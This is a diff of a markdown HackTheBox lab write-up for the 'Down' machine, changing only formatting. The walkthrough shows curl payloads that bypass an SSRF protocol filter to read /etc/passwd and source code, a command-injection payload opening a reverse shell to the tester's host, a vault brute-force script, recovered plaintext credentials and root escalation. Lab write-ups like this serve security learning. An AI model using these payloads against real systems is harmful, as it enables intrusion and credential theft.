@@ -1,11 +1,12 @@
 ---
 title: Down - SSRF Protocol Filter Bypass leading to Arbitrary File Read
 date: 2025-12-08 00:00:00 +0000
-categories: [HackTheBox Writeups]
+categories: [HackTheBox Writeups, Linux]
 tags: [hackthebox, linux]
 ---
 
-```bash
+
+```
 ares@legion:~/HackTheBox/Down$ sudo nmap -sVC -A -T4 $target
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-21 18:21 EST
 Nmap scan report for 10.129.234.87 (10.129.234.87)
@@ -33,32 +34,35 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 12.12 seconds
-```bash
+```
+
 Have the server send a request to your host and watch it with `nc` or Wireshark.
-![20251122012906.png](/assets/img/htb-writeups/Pasted image 20251122012906.png)
+![[Pasted image 20251122012906.png]]
 
 ```
 ffuf -u 'http://10.129.234.87/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -e .php,.txt,.bak -mc 200,301,302
 ```
 
-Sniper attack in burp intruder with /usr/share/seclists/Fuzzing/special-chars.txt
-![20251122020203.png](/assets/img/htb-writeups/Pasted image 20251122020203.png)
 
-```bash
+Sniper attack in burp intruder with /usr/share/seclists/Fuzzing/special-chars.txt
+![[Pasted image 20251122020203.png]]
+
+```
 curl -X POST http://10.129.234.87/index.php -d "url=http://+file:///etc/passwd"
 ```
-![20251122015953.png](/assets/img/htb-writeups/Pasted image 20251122015953.png)
+![[Pasted image 20251122015953.png]]
 
 Read source code:
-```bash
+```
 curl -X POST http://10.129.234.87/index.php -d "url=http://+file:///var/www/html/index.php"
 ```
+
 
 RCE payload:
 update GET to POST
 ?expermode=tcp
 ip=10.10.14.97&port=1337+-e+/bin/bash
-![20251122021236.png](/assets/img/htb-writeups/Pasted image 20251122021236.png)
+![[Pasted image 20251122021236.png]]
 nv -nvlp 1337
 
 ```
@@ -66,13 +70,14 @@ www-data@down:/home/aleks/.local/share/pswm
 
 cat pswm
 e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==www-data@down:/home/aleks/.local/share/pswm$ 
-```bash
+```
+
 https://github.com/Julynx/pswm
 
 download pswm file to kali
 
 python3 decrypt.py
-```bash
+```
 import cryptocode
 import os
 
@@ -99,13 +104,14 @@ for word in words:
         break
 
 ```
-![20251122023620.png](/assets/img/htb-writeups/Pasted image 20251122023620.png)
-```bash
+![[Pasted image 20251122023620.png]]
+```
 ares@legion:~/HackTheBox/Down$ python3 decrypt.py 
 flower
 ['pswm\taleks\tflower', 'aleks@down\taleks\t1uY3w22uc-Wr{xNHR~+E']
 [SUCCESS] Found with password: flower
 ```
+
 ```
 ssh aleks@10.129.234.87
 aleks@down:~$ sudo -l
@@ -121,4 +127,5 @@ root@down:~# id
 uid=0(root) gid=0(root) groups=0(root)
 
 ```
+
 
